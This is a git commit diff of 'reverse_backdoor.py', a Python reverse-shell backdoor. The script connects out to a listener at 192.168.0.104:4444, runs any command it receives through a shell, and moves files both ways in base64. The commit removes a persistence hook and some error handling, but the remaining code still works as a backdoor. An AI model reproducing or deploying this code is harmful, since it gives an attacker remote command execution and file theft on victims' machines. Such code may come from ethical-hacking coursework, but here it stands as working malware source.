c76bb58acc5f2035385a785e7963da6b5493b565
d4rk-c0d3r <64041468+d4rk-c0d3r@users.noreply.github.com>
2020-04-21 15:26:35 -0500

    Update reverse_backdoor.py

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -1,31 +1,26 @@
-import socket
-import subprocess, json, os, base64, sys, shutil
-
+import socket, json, os, base64
+import subprocess
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-
-
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data)
 
     def reliable_receive(self):
-        json_data = ""
+        json_data =""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data +self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
 
     def execute_system_command(self, command):
-        DEVNULL = open(os.devnull, 'wb')
-        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+        return subprocess.check_output(command, shell=True)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -38,7 +33,7 @@ class Backdoor:
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
-            return "[+] Upload successful. "
+            return "[+] Upload successful "
 
 
     def run(self):
@@ -47,7 +42,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    sys.exit()
+                    exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
@@ -57,15 +52,10 @@ class Backdoor:
                 else:
                     command_result = self.execute_system_command(command)
             except Exception:
-                command_result = "[-] Error during command execution "
-
+                command_result = "[-] Error during command execution"
             self.reliable_send(command_result)
 
 
 
-
-try:
-    my_backdoor = Backdoor("192.168.0.104", 4444)
-    my_backdoor.run()
-except Exception:
-    sys.exit()
+my_backdoor = Backdoor("192.168.0.104", 4444)
+my_backdoor.run()
